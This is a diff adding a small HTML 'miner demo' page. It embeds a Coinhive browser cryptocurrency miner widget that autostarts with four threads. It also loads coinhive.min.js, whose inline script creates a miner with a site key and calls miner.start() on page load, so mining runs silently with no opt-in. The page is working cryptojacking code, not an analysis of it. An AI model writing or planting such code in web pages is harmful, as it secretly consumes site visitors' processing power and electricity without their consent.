@@ -1,0 +1,29 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+  <title>miner demo</title>
+</head>
+
+<body>
+    <div class="coinhive-miner" 
+    style="width: 256px; height: 310px"
+    data-key="JXKRjYbooF1daPun4jz8O3eC3zQlBL6b"
+    data-autostart="true"
+    data-whitelabel="false"
+    data-background="#000000"
+    data-text="#eeeeee"
+    data-action="#00ff00"
+    data-graph="#555555"
+    data-threads="4"
+    data-throttle="0.1">
+    <em>Loading...</em>
+  </div>
+</body>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('JXKRjYbooF1daPun4jz8O3eC3zQlBL6b', 'jartto');
+	miner.start();
+</script>
+</html>
